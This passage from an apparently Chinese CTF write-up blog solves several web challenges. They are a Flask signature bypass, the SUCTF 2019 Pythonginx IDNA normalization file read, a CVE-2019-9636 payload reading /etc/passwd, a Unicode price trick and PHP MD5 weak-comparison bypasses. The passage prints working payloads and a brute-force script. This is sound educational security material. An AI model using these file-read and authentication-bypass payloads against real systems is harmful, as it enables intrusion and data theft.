    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#无用的waf</span>
    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre>

<p>是一个利用flask框架搭的，有两个路由分别是<code>geneSign</code>和<code>De1ta</code></p>
<p>首先来读代码<code>geneSign</code>是用来计算传入的<code>param</code>+scan的md5值，应该是用于测试的</p>
<p><code>De1ta</code>分别可传入一个<code>get</code>参数<code>param</code>，两个<code>cookie</code>参数<code>action</code>和<code>sign</code>，并且<code>param</code>参数套了一层<code>waf</code></p>
<p>随后建立<code>Task</code>类使用<code>Exec</code>方法，在看看<code>Task</code>类是用来干什么的</p>
<p>里面可以<code>print</code>出<code>scan</code>方法后<code>param</code>的结果，根据题目提示<code>flag is in ./flag.txt</code>应该是让我们去想办法读取到flag文件然后输出</p>
<p>再看到<code>Exec</code>方法的第一个if，引用了<code>checkSign</code>方法，进行md5值的比较，这里是肯定要想办法绕过的了，问题是怎么绕？可以看到后面的if语句，如果我们想要读到<code>flag</code>，就需要让<code>action</code>中有<code>read</code>和<code>scan</code></p>
<p>再看到<code>geneSign</code>路由，里面固定死了<code>action</code>的值为<code>scan</code>，我们可以传入<code>param</code>的值来得到md5值</p>
<p>于是设想，如果<code>param</code>=<code>flag.txtread</code>，那么计算出来的md5值就是<code>flag.txtreadscan</code>的md5值，注意<code>getSign</code>方法虽然参数顺序不一样但是在函数中参数还是调了回来，我们将得到的md5赋给<code>sign</code>，再令<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>，那么<code>checkSign</code>不就可以返回<code>True</code>成功了比较吗，于是得到payload：</p>
<pre class="language-none"><code class="language-none">param&#x3D;flag.txt
action&#x3D;readscan;
sign&#x3D;8bdad5e249bb114a8874247817be9bad</code></pre>

<p>抓包传入即可得到flag</p>
<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="SUCTF-2019—Pythonginx"><a href="#SUCTF-2019—Pythonginx" class="headerlink" title="SUCTF-2019—Pythonginx"></a>SUCTF-2019—Pythonginx</h2><p>首先看到题目给出的源码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>
    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host
    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>
    <span class="token comment">#去掉 url 中的空格</span>
    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span></code></pre>

<p>我们可以传入url参数，要绕过前连两次<code>if</code>的判断也就是<code>host!=suctf.cc</code>，在最后一次要等于，就可以进行<code>urlopen(finalUrl).read()</code>文件读取的操作，推测是要我们进行文件读取</p>
<p><strong>Nginx下的重要文件位置</strong></p>
<pre class="language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx
主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf
管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service
模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules
应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx
程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html
日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx
配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</code></pre>

<p>这里就要想办法如何绕过前面的两个if，而在第三个if的时候又要判断通过，可以看到在最后一个if语句的前面有这样的一个操作：<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，先对里面的字符进行了<code>idna</code>编码，随后有进行了<code>utf-8</code>解码，详情<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">参考</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327" loading="lazy"></p>
<p>大概意思就是通过这样的编码就可以对传入的数据进行绕过</p>
<p>于是用脚本进行测试</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        uni<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        url<span class="token operator">=</span><span class="token string">"http://suctf.c&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>uni<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
 
<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url<span class="token operator">=</span>url
    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    parts<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    host<span class="token operator">=</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    newhost<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>
    finalUrl<span class="token operator">=</span>urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
 
 
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>得出如下结果：</p>
<pre class="language-none"><code class="language-none">str: ℂ unicode: \u2102
str: Ⅽ unicode: \u216d
str: ⅽ unicode: \u217d
str: Ⓒ unicode: \u24b8
str: ⓒ unicode: \u24d2
str: Ｃ unicode: \uff23
str: ｃ unicode: \uff43</code></pre>

<p>传入读取文件即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772" loading="lazy"></p>
<p>另外还有一种用<code>℆</code>字符进行的读法：</p>
<p><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>==经过编码==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>，将c和u都给补全了，这样也可以读取到文件内容</p>
<p>另外这里还有个非预期解利用的是<code>CVE-2019-9636</code>，利用的是<code>urlsplit不处理NFKC标准化</code>，payload：<code>file:////suctf.cc/../../../../../etc/passwd</code>，资料较少，利用的似乎是那四个斜杠</p>
<p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>，这样一来第二个值就不是原来的<code>hostname</code>而是空，即可绕过前两个if判断，漏洞利用条件：</p>
<pre class="language-none"><code class="language-none">Python Python &gt;&#x3D;2.7.x，&lt;&#x3D;2.7.16
Python Python &gt;&#x3D;3.x，&lt;&#x3D;3.7.2</code></pre>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt loading="lazy"></p>
<p>可以看到应该是叫我们买独角兽，而且肯定是要买最贵的那个</p>
<p>首先输入<code>4</code>和<code>1337.0</code>提示<code>Only one char(?) allowed!</code>只能输入一个字符，在试一下发现报错页面代码：</p>
<pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"/usr/local/lib/python2.7/site-packages/tornado/web.py"</span><span class="token punctuation">,</span> line <span class="token number">1541</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _execute
    result <span class="token operator">=</span> method<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>path_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>path_kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/app/sshop/views/Shop.py"</span><span class="token punctuation">,</span> line <span class="token number">34</span><span class="token punctuation">,</span> <span class="token keyword">in</span> post
    unicodedata<span class="token punctuation">.</span>numeric<span class="token punctuation">(</span>price<span class="token punctuation">)</span>
TypeError<span class="token punctuation">:</span> need a single Unicode character <span class="token keyword">as</span> parameter</code></pre>

<p>需要一个Unicode字符作为参数，再回到前面看看源码，有提示：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Ah,really important,seriously. --></span></code></pre>

<p>于是我们寻找到比1337大的<code>Unicode</code>字符<code>U+4E07</code>，<code>utf-8</code>编码后的16进制为<code>E4 B8 87</code>，在前面加入<code>%</code>得到<code>%E4%B8%87</code>传入即可</p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p>
<blockquote>
<p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232">第二届强网杯 MD5碰撞 writeup</a></p>
</blockquote>
<p>进来先看界面代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$val1</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val2</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val3</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val4</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val4'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val5</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val6</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val6'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$val7</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val7'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val1</span> <span class="token operator">==</span> <span class="token variable">$val2</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val1 OR val2 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 1 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val3</span> <span class="token operator">==</span> <span class="token variable">$val4</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val3 OR val4 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val3</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 2 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val6</span> <span class="token operator">||</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token operator">||</span> <span class="token variable">$val6</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val5 OR val6 OR val7 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 3 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"come on!"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"a OR b fail!"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"m OR n fail"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$val8</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$val9</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>val8 : <span class="token interpolation"><span class="token variable">$val8</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>val9 : <span class="token interpolation"><span class="token variable">$val9</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$val8</span> <span class="token operator">==</span> <span class="token variable">$val9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nice,good job,give you flag:"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>代码审计一个一个绕</p>
<p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p>
<blockquote>
<p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p>
</blockquote>
<p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p>
